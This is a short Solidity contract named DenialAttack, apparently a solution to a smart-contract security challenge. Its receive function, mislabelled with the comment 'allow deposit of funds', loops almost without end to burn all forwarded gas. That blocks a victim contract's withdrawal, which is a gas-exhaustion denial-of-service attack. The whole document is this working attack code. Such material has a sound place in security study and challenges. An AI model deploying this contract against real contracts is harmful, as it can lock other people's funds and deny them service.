// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract DenialAttack {
    uint256 public timeLastWithdrawn;

    // allow deposit of funds
    receive() external payable {
        for (uint256 i = 0; i < uint256(-1); i++) {
            timeLastWithdrawn += i;
        }
    }
}
